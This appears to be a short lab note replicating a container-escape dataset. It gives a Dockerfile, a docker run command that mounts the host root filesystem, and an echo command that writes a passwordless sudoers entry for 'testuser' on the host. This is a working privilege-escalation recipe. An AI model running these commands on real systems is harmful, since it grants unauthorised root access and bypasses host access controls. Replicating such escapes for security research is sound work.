# Host Execution

I attempted to replicate the following repository:
https://github.com/jpope8/container-escape-dataset/tree/main/containers

The first method which is using a ready container failed, but I will explain the second method:

## Method 2 - Creating an overprivileged docker image

Create a `Dockerfile` with the following content in a folder of choice:
```
FROM alpine
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME $WORKDIR
WORKDIR $WORKDIR
```

And then run the following:
`docker build -t priv-container .`

Now, we have a new image called `priv-container` that is malicious, and if given access, it has the capability of creating malicious files on the host machine.

We execute a container of the image we just created:

`docker run --name ESCAPE_PRIVESC -v /:/privesc -it priv-container /bin/sh`

and from within the container, we run 

`echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-nopasswd`

as an example attack. This script leads to creation of a file that overrides password protection and leads to the user account "testuser" (we assume that it exists and is a password-protected sudoer) to be accessible without password protection.

#vuln_attempt_done
